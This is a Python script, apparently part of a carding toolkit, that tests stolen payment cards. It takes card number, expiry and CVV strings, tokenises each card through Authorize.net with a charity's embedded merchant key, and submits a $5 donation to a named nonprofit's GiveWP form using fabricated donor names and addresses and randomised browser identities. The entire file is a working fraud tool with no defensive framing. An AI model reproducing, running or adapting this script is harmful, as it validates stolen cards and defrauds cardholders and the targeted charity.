import asyncio
import base64
import random
import time
from urllib.parse import urlparse
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import requests
from FUNC.defs import *
import json
import hashlib

def gets(s, start, end):
    try:
        start_index = s.index(start) + len(start)
        end_index = s.index(end, start_index)
        return s[start_index:end_index]
    except ValueError:
        return None
    

async def create_shopify_charge(fullz, session):
    try:
        cc, mes, ano, cvv = fullz.split("|")
        cc1 = cc[:4]
        cc2 = cc[4:8]
        cc3 = cc[8:12]
        cc4 = cc[12:]
        user_agent = UserAgent().random
        random_data = await get_random_info(session)
        fname = random_data["fname"]
        lname = random_data["lname"]
        email = random_data["email"]
        address             = "12 Main Street"
        city                = "Brewster"
        state               = "New York"
        state_short         = "NY"
        country             = "United States"
        zip_code            ="10509"
        phone               ="(727) 945-1000"

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json; charset=UTF-8',
            'DNT': '1',
            'Origin': 'https://futuremindsfoundation.org',
            'Referer': 'https://futuremindsfoundation.org/?givewp-route=donation-form-view&form-id=1536',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        json_data = {
            'securePaymentContainerRequest': {
                'merchantAuthentication': {
                    'name': '2hc57CyEM32',
                    'clientKey': '7dHEH3mb59ns6nVb6Rn5end28CB5RNkjKJ6cMmqNeKKJ548kaCb22aG2Sa9Jpz47',
                },
                'data': {
                    'type': 'TOKEN',
                    'id': '016ef40a-0ba8-ada2-6e7d-08b624b68b50',
                    'token': {
                        'cardNumber': f'{cc}',
                        'expirationDate': f'{mes}{ano}',
                        'cardCode': f'{cvv}',
                    },
                },
            },
        }

        response = await session.post('https://api2.authorize.net/xml/v1/request.api', headers=headers, json=json_data)

        dataValue = gets(response.text, '"dataValue":"', '"},')





        headers = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9,de;q=0.8,it;q=0.7,ru;q=0.6,es;q=0.5',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryQqfboiAGegBFtYqA',
            'dnt': '1',
            'origin': 'https://futuremindsfoundation.org',
            'priority': 'u=1, i',
            'referer': 'https://futuremindsfoundation.org/?givewp-route=donation-form-view&form-id=1536',
            'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': '3a1e7a6c01d22ccf1dc5901094cfb538',
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': '1738731365',
        }

        files = {
            'amount': (None, '5'),
            'currency': (None, 'USD'),
            'donationType': (None, 'single'),
            'subscriptionPeriod': (None, 'one-time'),
            'subscriptionFrequency': (None, '1'),
            'subscriptionInstallments': (None, '0'),
            'formId': (None, '1536'),
            'gatewayId': (None, 'authorize'),
            'feeRecovery': (None, '0'),
            'firstName': (None, 'GRADY'),
            'lastName': (None, 'SOLOMON'),
            'company': (None, ''),
            'email': (None, f'{email}'),
            'comment': (None, ''),
            'anonymous': (None, 'false'),
            'country': (None, 'US'),
            'address1': (None, '5242 Panola Mill Drive'),
            'address2': (None, ''),
            'city': (None, 'Boonville'),
            'state': (None, 'GA'),
            'zip': (None, '30038'),
            'opt_out': (None, 'false'),
            'originUrl': (None, 'https://futuremindsfoundation.org/donate-now/'),
            'isEmbed': (None, 'true'),
            'embedId': (None, 'give-form-shortcode-1'),
            'gatewayData[give_authorize_data_descriptor]': (None, 'COMMON.ACCEPT.INAPP.PAYMENT'),
            'gatewayData[give_authorize_data_value]': (None, f'{dataValue}'),
        }

        response = await session.post('https://futuremindsfoundation.org/', params=params, headers=headers, files=files)


        return response.text

    except Exception as e:
        return str(e)
